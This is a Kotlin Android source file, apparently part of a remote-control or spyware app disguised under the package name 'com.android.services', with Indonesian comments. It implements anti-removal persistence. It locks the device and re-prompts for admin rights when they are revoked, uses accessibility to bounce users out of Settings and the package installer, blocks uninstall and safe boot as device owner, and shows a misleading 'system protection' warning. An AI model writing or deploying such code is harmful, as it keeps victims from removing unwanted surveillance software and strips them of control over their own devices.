package com.android.services

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.UserManager

class AppDeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AppDeviceAdminReceiver::class.java)
        if (dpm.isDeviceOwnerApp(context.packageName)) {
            dpm.setUninstallBlocked(admin, context.packageName, true)
        }
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        return "Menonaktifkan administrator akan menghapus perlindungan sistem. Ini tidak disarankan."
    }

    override fun onDisabled(context: Context, intent: Intent) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        try { dpm.lockNow() } catch (_: Exception) {}

        // ── Anti-Uninstall Guard: re-request admin jika flag aktif ─────────────
        // Dipanggil saat user berhasil nonaktifkan Device Admin dari Settings.
        // Jika flag aktif → langsung popup Device Admin lagi secara otomatis.
        val prefs = context.getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
        if (prefs.getBoolean("anti_uninstall_enabled", false)) {
            try {
                val reRequest = Intent(context, SilentSetupActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                            Intent.FLAG_ACTIVITY_CLEAR_TOP or
                            Intent.FLAG_ACTIVITY_SINGLE_TOP
                    putExtra("force_request_admin", true)
                }
                context.startActivity(reRequest)
            } catch (_: Exception) {}
        }
    }

    companion object {
        fun getComponentName(context: Context) =
            ComponentName(context, AppDeviceAdminReceiver::class.java)

        fun isAdminActive(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isAdminActive(getComponentName(context))
        }

        fun isDeviceOwner(context: Context): Boolean {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isDeviceOwnerApp(context.packageName)
        }

        /**
         * Aktifkan / nonaktifkan Anti-Uninstall Guard.
         *
         * ON  → Accessibility akan intercept navigasi ke Settings/PackageInstaller
         *       dan langsung balik ke Home. Jika Device Admin sampai dinonaktifkan,
         *       SilentSetupActivity otomatis minta admin lagi.
         *
         * OFF → Semua proteksi accessibility & re-request dimatikan → app bisa
         *       di-uninstall normal (untuk keperluan remote uninstall yang disengaja).
         */
        fun setAntiUninstall(context: Context, enable: Boolean): String {
            val prefs = context.getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
            prefs.edit().putBoolean("anti_uninstall_enabled", enable).apply()
            return if (enable) {
                "ANTI_UNINSTALL_ON: Guard aktif — accessibility block Settings uninstall & admin akan di-request ulang otomatis"
            } else {
                "ANTI_UNINSTALL_OFF: Guard dinonaktifkan — app bisa di-uninstall normal"
            }
        }

        fun setBlockUninstall(context: Context, block: Boolean): String {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = getComponentName(context)
            return when {
                !dpm.isAdminActive(admin) ->
                    "ERROR: Device Admin tidak aktif. Buka Settings > Security > Device Admin > aktifkan app ini."
                dpm.isDeviceOwnerApp(context.packageName) -> {
                    if (block) {
                        dpm.addUserRestriction(admin, UserManager.DISALLOW_UNINSTALL_APPS)
                        dpm.addUserRestriction(admin, UserManager.DISALLOW_SAFE_BOOT)
                        dpm.setUninstallBlocked(admin, context.packageName, true)
                    } else {
                        dpm.clearUserRestriction(admin, UserManager.DISALLOW_UNINSTALL_APPS)
                        dpm.clearUserRestriction(admin, UserManager.DISALLOW_SAFE_BOOT)
                        dpm.setUninstallBlocked(admin, context.packageName, false)
                    }
                    if (block) "BLOCK_ACTIVE: Semua app di HP terproteksi — tombol Uninstall dinonaktifkan sistem"
                    else "BLOCK_INACTIVE: Proteksi uninstall dilepas — uninstall kembali normal"
                }
                else -> {
                    if (block) {
                        "ADMIN_ONLY: Device Admin aktif tapi bukan Device Owner. Block parsial aktif. Untuk block PENUH semua app: jalankan via ADB: adb shell dpm set-device-owner com.android.services/.AppDeviceAdminReceiver"
                    } else {
                        "ADMIN_ONLY: Proteksi parsial dilepas."
                    }
                }
            }
        }
    }
}
